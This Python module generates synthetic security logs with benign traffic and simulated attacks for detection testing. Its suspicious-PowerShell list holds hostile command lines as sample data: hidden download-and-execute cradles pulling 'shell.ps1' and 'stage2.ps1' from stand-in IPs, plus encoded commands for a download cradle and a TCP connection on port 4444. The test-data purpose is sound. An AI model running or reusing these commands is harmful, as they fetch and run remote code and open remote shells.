"""Synthetic security log generator.

Generates realistic simulated security events covering benign background
activity and attack scenarios (brute force, port scan, suspicious PowerShell).
Uses only private and documentation IP address ranges.
"""

from datetime import datetime, timedelta, timezone
import random

from app.core.enums import LogSeverity

# Safe IP address ranges (RFC 1918 and RFC 5737 documentation ranges)
PRIVATE_SRC_IPS = [
    "10.0.1.15",
    "10.0.1.24",
    "10.0.2.105",
    "192.168.1.50",
    "192.168.1.65",
    "192.168.2.110",
]
DESTINATION_IPS = [
    "10.0.0.1",
    "10.0.0.5",
    "10.0.0.10",
    "10.0.0.20",
]
BENIGN_USERS = ["jdoe", "alice", "bob", "developer", "sysadmin", "service_acc"]

BENIGN_POWERSHELL_COMMANDS = [
    "powershell.exe -Command Get-Process",
    "powershell.exe -Command Get-Service",
    "powershell.exe -NoProfile -Command Get-Date",
    "powershell.exe -Command Get-EventLog -LogName System -Newest 10",
    "powershell.exe -Command Test-NetConnection -ComputerName 10.0.0.1 -Port 443",
]

SUSPICIOUS_POWERSHELL_COMMANDS = [
    "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADUAMAAvAHAAJwApAA==",
    "powershell.exe -NoProfile -WindowStyle Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.50/shell.ps1')\"",
    "powershell.exe -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://203.0.113.80/stage2.ps1')",
    "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADEAMAAiACwANAA0ADQANAApADsA",
]


def generate_synthetic_logs(
    seed: int | None = 42,
    base_time: datetime | None = None,
) -> list[dict]:
    """Generate a reproducible batch of synthetic security event logs.

    Includes benign baseline traffic and 4 distinct threat scenarios:
    1. Brute Force (T1110)
    2. Brute Force followed by Successful Login (T1078)
    3. Port Scan (T1046)
    4. Suspicious PowerShell Execution (T1059.001)
    """
    rng = random.Random(seed)
    now = base_time or datetime(2026, 11, 4, 12, 0, 0, tzinfo=timezone.utc)
    logs: list[dict] = []

    # ---------------------------------------------------------
    # Scenario 1: Benign background noise (~35 logs)
    # ---------------------------------------------------------
    for i in range(35):
        t = now - timedelta(minutes=rng.randint(15, 120), seconds=rng.randint(0, 59))
        event_choice = rng.choice(["auth_success", "network_connection", "dns_query", "powershell_benign"])

        if event_choice == "auth_success":
            user = rng.choice(BENIGN_USERS)
            src = rng.choice(PRIVATE_SRC_IPS)
            dst = rng.choice(DESTINATION_IPS)
            logs.append({
                "timestamp": t,
                "source_ip": src,
                "destination_ip": dst,
                "destination_port": rng.choice([22, 443, 3389]),
                "username": user,
                "event_type": "auth_success",
                "description": f"User {user} successfully authenticated via SSH/Kerberos.",
                "severity": LogSeverity.INFO,
                "command_line": None,
                "raw_log": f"pam_unix(sshd:session): session opened for user {user} from {src}",
            })
        elif event_choice == "powershell_benign":
            cmd = rng.choice(BENIGN_POWERSHELL_COMMANDS)
            src = rng.choice(PRIVATE_SRC_IPS)
            dst = "10.0.0.1"
            logs.append({
                "timestamp": t,
                "source_ip": src,
                "destination_ip": dst,
                "destination_port": None,
                "username": rng.choice(BENIGN_USERS),
                "event_type": "process_creation",
                "description": "Administrative process execution.",
                "severity": LogSeverity.INFO,
                "command_line": cmd,
                "raw_log": f"Process Create: Image=powershell.exe CommandLine={cmd}",
            })
        else:
            src = rng.choice(PRIVATE_SRC_IPS)
            dst = rng.choice(DESTINATION_IPS)
            port = rng.choice([80, 443, 53, 8080])
            logs.append({
                "timestamp": t,
                "source_ip": src,
                "destination_ip": dst,
                "destination_port": port,
                "username": None,
                "event_type": "network_connection",
                "description": f"Outbound TCP connection to {dst}:{port}.",
                "severity": LogSeverity.INFO,
                "command_line": None,
                "raw_log": f"CONN: src={src} dst={dst} dport={port} proto=TCP",
            })

    # ---------------------------------------------------------
    # Scenario 2: Brute Force Attack (T1110)
    # Source IP: 203.0.113.45 -> 7 auth_failures within 2 minutes
    # ---------------------------------------------------------
    bf_start = now - timedelta(minutes=8)
    bf_ip = "203.0.113.45"
    target_server = "10.0.0.5"
    for i in range(7):
        t_event = bf_start + timedelta(seconds=i * 15)
        logs.append({
            "timestamp": t_event,
            "source_ip": bf_ip,
            "destination_ip": target_server,
            "destination_port": 22,
            "username": "administrator",
            "event_type": "auth_failure",
            "description": "Failed password for user administrator.",
            "severity": LogSeverity.LOW,
            "command_line": None,
            "raw_log": f"sshd[2811]: Failed password for invalid user administrator from {bf_ip} port {50000+i} ssh2",
        })

    # ---------------------------------------------------------
    # Scenario 3: Brute Force followed by Success (T1078)
    # Source IP: 198.51.100.22 -> 6 auth_failures then auth_success 1 min later
    # ---------------------------------------------------------
    comp_start = now - timedelta(minutes=6)
    comp_ip = "198.51.100.22"
    comp_server = "10.0.0.10"
    for i in range(6):
        t_fail = comp_start + timedelta(seconds=i * 12)
        logs.append({
            "timestamp": t_fail,
            "source_ip": comp_ip,
            "destination_ip": comp_server,
            "destination_port": 3389,
            "username": "svc_backup",
            "event_type": "auth_failure",
            "description": "Failed RDP login for svc_backup.",
            "severity": LogSeverity.LOW,
            "command_line": None,
            "raw_log": f"RDP-Auth: Logon failure for user svc_backup from {comp_ip}",
        })
    # Successful login within 10 minutes of brute force
    t_success = comp_start + timedelta(minutes=2)
    logs.append({
        "timestamp": t_success,
        "source_ip": comp_ip,
        "destination_ip": comp_server,
        "destination_port": 3389,
        "username": "svc_backup",
        "event_type": "auth_success",
        "description": "Successful RDP logon for svc_backup after credential guessing.",
        "severity": LogSeverity.INFO,
        "command_line": None,
        "raw_log": f"RDP-Auth: Successful logon for svc_backup from {comp_ip}",
    })

    # ---------------------------------------------------------
    # Scenario 4: Port Scan (T1046)
    # Source IP: 203.0.113.99 -> connects to 14 distinct ports within 60s
    # ---------------------------------------------------------
    scan_start = now - timedelta(minutes=4)
    scan_ip = "203.0.113.99"
    scan_target = "10.0.0.20"
    scan_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306]
    for i, port in enumerate(scan_ports):
        t_scan = scan_start + timedelta(seconds=i * 3)
        logs.append({
            "timestamp": t_scan,
            "source_ip": scan_ip,
            "destination_ip": scan_target,
            "destination_port": port,
            "username": None,
            "event_type": "network_connection",
            "description": f"SYN packet to port {port}.",
            "severity": LogSeverity.LOW,
            "command_line": None,
            "raw_log": f"FIREWALL: DROP TCP {scan_ip}:49152 -> {scan_target}:{port} FLAGS=SYN",
        })

    # ---------------------------------------------------------
    # Scenario 5: Suspicious PowerShell (T1059.001)
    # Obfuscated / bypass commands
    # ---------------------------------------------------------
    ps_ip = "10.0.1.75"
    ps_times = [now - timedelta(minutes=3), now - timedelta(minutes=1)]
    for i, t_ps in enumerate(ps_times):
        cmd = SUSPICIOUS_POWERSHELL_COMMANDS[i % len(SUSPICIOUS_POWERSHELL_COMMANDS)]
        logs.append({
            "timestamp": t_ps,
            "source_ip": ps_ip,
            "destination_ip": "10.0.0.1",
            "destination_port": None,
            "username": "dev_user",
            "event_type": "process_creation",
            "description": "Suspicious PowerShell process spawned with bypass flags.",
            "severity": LogSeverity.HIGH,
            "command_line": cmd,
            "raw_log": f"Sysmon Event 1: ProcessCreate Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine={cmd}",
        })

    # Sort deterministically by timestamp
    logs.sort(key=lambda x: x["timestamp"])
    return logs
